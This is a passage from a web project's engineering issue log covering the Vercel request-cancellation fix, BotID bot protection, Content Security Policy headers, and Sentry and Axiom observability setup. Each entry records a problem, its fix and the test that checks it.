    a package's code* (Apify's MCP server). On `MCP · with auth` the forecast took 10.5 s, against 3.6 s on
    `REST · with auth`, for runs of 4 s and 3 s. When a run has succeeded but its dataset's count still reads 0, which
    can lag by up to about 5 s, Apify's server reads the dataset again after 1, 3 and 5 s before it answers
    (`src/tools/actors/actor_run_response.ts`). **Fix:** none in the code. At the live check's speeds (0.7 s to
    connect, 5 to 6 s of `call-actor` around the run, 0.1 s for the items), the Actor call's 25 s only just hold an
    18-second run and that wait, about 24 to 25 s; a slower start or handshake makes such a late run fall back, and
    the chip says Apify took too long (entry 92). Runs have taken 2 to 4 s so far (step 6's 2 to 3 s, these 4 s and
    3 s), far from the 18 s limit. Step 7's page and the plan give the measured times. **Check:** step 7's live
    check, on its page.
99. **The deploy check was stopped, and a local server was still running.** *Deploying* (step 7's live check). This
    laptop ran low on memory, and the background deploy check was stopped before it saw step 7 live; and a
    `next start` on port 3123 had been left running since the day before, entry 85's lesson not kept. Neither changed
    a result. **Fix:** we stopped the server and ran the deploy check again, in the foreground: step 7 was live, and
    its CI run had passed. **Check:** the live check ran on `f32d6c3`, the step's own commit.
100. **After a failed answer, the page's going would be logged as a stop.** *Reading a package's code* (AI SDK's chat,
     while fixing entry 96). The page's chat throws on the first error chunk: it shows our sentence, stops reading and
     goes. Where that going aborts the request, on Next.js's own server and on Vercel once cancellation is on (entry
     101), `onAbort` would then write `chat.aborted` after `chat.failed`: two endings for one answer, as in bug story
     2. Stopping the run ourselves at the error part looked cheaper, since no one reads what follows, but in a test it
     dropped the error part: the page got only `start` and `abort`. AI SDK awaits `onError` before it passes a
     model's error part on, to check whether to retry the stream, so a stop there cancels the part. **Fix:** after
     `chat.failed`, an abort writes no line, and the run stops when the page's going reaches it. **Check:**
     `tests/unit/chat/run-chat.test.ts`.
101. **On Vercel, Stop doesn't reach the function.** *Review* (of issue 96's fix), *reading Vercel's docs, and
     testing the live site*. Vercel tells a function that its caller has gone, through `request.signal`, only when
     cancellation is turned on for it (`"supportsCancellation": true` in `vercel.json`), and this project has none.
     So on the live site, Stop, or closing the page, ends the stream on the page, but the answer goes on to its end,
     with its model calls, tool calls and any paid Actor run, and is logged as `chat.done`; AI SDK's docs say as
     much. Live, on 30 October, a chat that hung up after its first bytes, 2.1 s in, still ran its tool calls and
     model steps, and ended with `chat.done` after 3.7 s. On Next.js's own server, Next.js aborts the request's signal
     when the page goes (its request adapter, bug story 10; the unit tests stand in for it), so Stop would stop the
     answer there, and our code's comments and docs say it does. **Fix:** `vercel.json` turns cancellation on for
     `app/api/chat/route.ts`, so the page's going aborts the request's signal. Since Vercel then ends the function,
     the route keeps it alive with `waitUntil`, from its start until the request's last line is written and its lane
     closed, an early failure included; `runChat` says when its lane has closed. A page that goes while its message
     is still being read is logged as stopped, not as a refused message. And the answer gets its last line
     however the page's going arrives: if its stream is cancelled while the model's text is still coming, AI SDK can
     stall on its full queue and never call `onAbort` (the review showed it with a script), so the stream's own end
     writes `chat.aborted` when no other line has. With that, the four places that say Stop stops the answer should
     hold on Vercel too (`app/api/chat/route.ts`, `docs/system-design.md`, `PLAN.md` 7.4, `docs/step-5.md`), and the
     live check showed they do, though not always at once (bug story 16). **Check:**
     `tests/unit/chat/run-chat.test.ts` (the page's going while the text is coming, its signal or its stream first:
     one `chat.aborted`, and the end said only once the lane has closed),
     `tests/unit/app/api/chat/route.test.ts` (`vercel.json` names the route; the function kept alive until an early
     failure's last line; a page gone while its message is read); on the live site, once `c295125` was live, a
     hang-up right after the first bytes was heard about 7 s later, and one at the answer's first words at once,
     each ending with `chat.aborted` and no `chat.done`.
102. **Vercel's log view listed some lines twice.** *Deploying* (issue 101's live check). In the two cancelled
     requests, some of the chat's lines showed twice, each pair the same line to the millisecond, `chat.request`
     included. pino writes each line once, synchronously, and the tests count each once, so the doubles come from
     Vercel's logging, most likely its view. **Fix:** none in our code; the dashboards (step 9) count endings per
     request id, not lines. **Check:** the tests' exact line lists (`tests/unit/chat/run-chat.test.ts`).

## Step 8 · Protection: BotID and the Security Headers

103. **BotID works only on Vercel.** *Reading a package's code* (`botid` 1.5.12). Its page side turns itself off only
     under `next dev`. Under `next start`, as the browser tests run, it would wrap `fetch` and wait for a challenge
     script that only Vercel serves, so the chat would fail before the tests' recorded answer; and `checkBotId()`
     throws without Vercel's OIDC token. **Fix:** both sides turn on only where Vercel sets `VERCEL=1`, through one
     switch (entry 106). **Check:** `tests/unit/next-config.test.ts`; the browser tests run as before.
104. **The Content Security Policy reports before it blocks.** *Reading a package's code.* BotID loads its challenge
     script from our own origin, and what that script needs isn't documented; Next.js's pages need inline scripts and
     styles. A policy that blocked something we need would stop the chat on the live site. **Fix:**
     `Content-Security-Policy-Report-Only` first, with `X-Frame-Options: DENY` against framing meanwhile; enforced
     once the live console shows no report that matters. **Check:** `tests/unit/next-config.test.ts`; the live
     check.
105. **An environment variable's name broke the naming rule.** *Checking our work* (lint). `NEXT_PUBLIC_BOTID`, a key
     in `next.config.ts`'s `env`, is CONSTANT_CASE, as environment variables are. **Fix:** `next.config.ts` and its
     test join the files where Biome allows CONSTANT_CASE keys, with `lib/config.ts`. **Check:** `npm run lint`.
106. **The page's switch and the route's could disagree.** *Review, medium.* As first written, the page learned whether
     BotID runs from a value set when it was built, the route from `VERCEL` when it ran, and only the page's "off" was
     tested. Had they disagreed on Vercel, every real message would have reached `checkBotId()` without BotID's answer
     and been refused, and no check would have noticed: the browser tests answer `/api/chat` in the page. **Fix:** one
     switch, `isBotIdOn()` (`lib/botid.ts`), read by both, from the value Next.js writes into the page's code and the
     route's alike. **Check:** `tests/unit/next-config.test.ts` (on for an app built on Vercel, off elsewhere),
     `tests/unit/instrumentation-client.test.ts` (the page starts BotID for the chat's `POST` only when it's on); on the
     live site, a real message from a real browser.
107. **BotID's check had no time limit, and its failure stopped the chat.** *Review, medium.* `checkBotId()` asks
     Vercel's API with no time limit of its own (`botid`'s server code), so a slow answer would have held every
     message until the function's 60 s, and an error there would have answered every message "Something went wrong".
     **Fix:** the check gets 3 s and the request's signal (`untilAborted()` in `lib/utils.ts`); if BotID can't answer,
     or answers with no verdict (it reads Vercel's answer without checking its status), the request goes on, with a
     `botid.failed` line at warn: the rate limit still holds, and BotID's trouble mustn't stop the chat. A check still
     running when the page has gone is left to settle, its failure handled. **Check:**
     `tests/unit/app/api/chat/route.test.ts`, `tests/unit/utils.test.ts`.
108. **Nothing watched the reporting policy.** *Review, low.* A policy that only reports never fails a test, and BotID
     is off where the tests run. **Fix:** a browser test keeps every `securitypolicyviolation` report through an
     answer, a chip, the compare view and three documentation pages, and fails on any; BotID's own needs show on the
     live site, where the same test runs against it. **Check:** `tests/e2e/chat-page.spec.ts`.
109. **Smaller review findings on step 8.** *Review.* A script's refused request writes two lines, not one: BotID writes
     a plain line of its own, saying the request carried no answer to its challenge. And `Permissions-Policy` allowed
     the microphone, which no step uses until step 13: now `microphone=()`.
110. **The policy reported zod's `new Function`.** *Checking our work* (entry 108's browser test, on its first run). The
     chat page reported `script-src eval`: zod 4, with which AI SDK checks each part of an answer in the page, probes
     once for `new Function`, to build faster parsers, and a policy without `'unsafe-eval'` reports the probe, though
     zod catches the error and falls back. Enforced, the policy would report it on every visit. **Fix:** the page's zod
     runs without the faster parsers (`z.config({ jitless: true })` in `instrumentation-client.ts`), so it never
     probes; the server keeps them. **Check:** `tests/e2e/chat-page.spec.ts`,
     `tests/unit/instrumentation-client.test.ts`.
111. **BotID refused real browsers, so the chat answered no one.** *Deploying* (step 8's live check). Once `d9ed4c0`
     was live, a message from a real browser got "We couldn't verify this browser": first from a Chrome tab our tools
     drove, then from yours, in the same Chrome profile. BotID's page side was running (its script loaded, `fetch`
     wrapped), so each message
     carried BotID's answer, and BotID's check still called it a bot. The browser tests hadn't seen it: they answer
     `/api/chat` in the page, so no real message reaches the route. **Fix, for now:** BotID is off everywhere
     (`NEXT_PUBLIC_BOTID` is "off" in `next.config.ts`), the security headers stay; why real browsers fail its check
     is next. **Check:** `tests/unit/next-config.test.ts`; a real message on the live site.
112. **The page barely showed it was working.** *Using the app* (the user's feedback). While an answer was on its way,
     the page showed "Nimbus is checking the weather…" with a small pulsing dot, and only until the first tool call:
     between the model's steps it showed nothing moving. **Fix:** a turning ring beside the text, shown from Send until
     the answer's first words, through its tool calls (`isAwaitingWords()` in `lib/utils.ts`); it stands still for
     those who ask for less motion. **Check:** `tests/unit/utils.test.ts`, `tests/e2e/chat-page.spec.ts`.

## Step 9 · Observability: Axiom and Sentry

113. **Sentry 11 moved its build step.** *Checking our work* (the typecheck: `next typegen` stopped at
     "withSentryConfig is not a function"). In Sentry's version 11, `withSentryConfig` lives in
     `@sentry/nextjs/config`; the package's main entry no longer has it. **Fix:** `next.config.ts` imports it from
     there. **Check:** `npm run typecheck`, `npm run build`.
114. **Sentry would have kept the question.** *Reading a package's code* (`@sentry/nextjs` 11.8.0). Version 11 dropped
     `sendDefaultPii`, the setting first written to keep personal data out, so it did nothing; its new
     `dataCollection` collects everything unless told not to: IP addresses, cookies, request and response headers and
     bodies (the chat's body holds the question), query strings, AI prompts and answers, and a stack frame's
     variables. The first failure in a chat would have sent its question to Sentry. **Fix:** `lib/sentry.ts` turns
     each one off, and keeps no breadcrumbs, since an outgoing call's address can hold a place's name. **Check:**
     `tests/unit/sentry.test.ts`.
115. **Sentry's trace headers would have gone to every service we call.** *Reading a package's code.* Sentry decides
     whether to add its `sentry-trace` and `baggage` headers to a request the server makes by
     `tracePropagationTargets`, and with none set, it adds them to every one: Gemini, Open-Meteo and Apify would get
     our release, our Sentry key's public half and a trace id. **Fix:** `tracePropagationTargets: []`, in
     `lib/sentry.ts`. **Check:** `tests/unit/sentry.test.ts`.
116. **Sentry's build step made the page's source maps without a token.** *Reading a package's code.* For a Turbopack
     build, `withSentryConfig` turns the page's source maps on, whether or not it has a token to upload them with; on
     a laptop, in CI or on a preview it has none. It also wrote a list of our routes into the page's script, which
     only Sentry in the browser reads, and ours runs on the server only. **Fix:** no source maps without Sentry's
     token (`sourcemaps.disable`), and no list (`routeManifestInjection: false`). **Check:** after `npm run build`,
     `.next/static/chunks` holds no `.map` file and no list.
117. **Sentry's names met two of our checks.** *Checking our work* (lint, and the unit tests). Its `genAI` setting has
     two capitals in a row, which our naming rule refuses: it's allowed in `lib/sentry.ts` and its test, as
     Playwright's names are in its config. And `withSentryConfig` adds four `_sentry…` entries to `next.config.ts`'s
     `env` (the release among them), where two tests expected BotID's switch alone: they check the switch itself now.
     **Check:** `npm run lint`, `tests/unit/next-config.test.ts`.
118. **`npm audit` reports 4 "high" findings, all one old zod.** *Checking our work* (`npm audit`, while adding Sentry,
     which adds none: they were there before). `@vercel/functions` 3.10.4 → `@vercel/oidc` 4.0.4 →
     `@vercel/cli-config` 0.3.4, which pins zod 4.1.11; below 4.6.6, zod can exhaust memory checking oversized
     collections (GHSA-mrhx-c7xc-m3w5). That copy only reads the Vercel CLI's own files, never a user's input; our own
     checks use zod 4.6.7. `npm audit fix --force` would take `@vercel/functions` back to 3.6.1, a breaking change.
     **Fix, next:** an npm override for that one package, or `@vercel/functions`' next release (on the To do page).
     **Check:** `npm audit --omit=dev`.
119. **The shipper never read Axiom's reply.** *Review, low.* Node's `fetch` keeps the connection of a reply nobody
     reads until the reply is collected, and a warm function sends a batch at the end of every request. **Fix:** the
     reply is let go (`body.cancel()`) once its status is read; if that fails, it's let pass, since the status has
     already said how the batch went. **Check:** `tests/unit/log-shipper.test.ts`, which failed before the fix.
120. **Part 1, checked on the live site.** *Deploying* (`047a079`). A question on `MCP · no auth` (ref `09600883`) put
     its lines in Axiom under one request id, from both functions: `/api/chat`'s, and `/api/mcp`'s `upstream.http` and
     `mcp.call`. Axiom took each line's `ts` as its time: the events have no `ts` field left, only `_time`. Sentry
     holds the build's source maps, two uploads (18 and 194 files) under the commit's release. No Sentry event yet:
     nothing failed at `error`. **Check:** Axiom's Query tab; Sentry's project settings, Source Maps.
121. **Answers were slow after the deploy, and the first question failed.** *Deploying* (part 1's live check). The
     first question once `047a079` was live got "The weather service took too long to answer" in 4.4 s: connecting to
     our MCP server took 3,004 ms (`lane.connect`, failed), over its 3 s budget, where connections took 0.2 to 1.8 s
     before. And Gemini's steps took 3 to 27 s each, and one ran over 36 s until the 50 s budget cut it, where steps
     took under 1 s each before (the Lyon answer, 4.0 s in all): two answers ran out their 50 s (`budget.exceeded`),
     and for such an answer the page says it was cut short. Our own parts were quick: tools 8 to 716 ms, Open-Meteo
     0.5 s. Not yet known: how much of it the start-up Sentry adds to a cold function explains, and how much Gemini's
     free tier was slow that hour. **Fix, next** (on the To do page): time a cold `/api/mcp`, with and without
     Sentry's start-up; watch Gemini's step times in Axiom over a day. **Check:** the lines in Axiom, under each
     request's id.
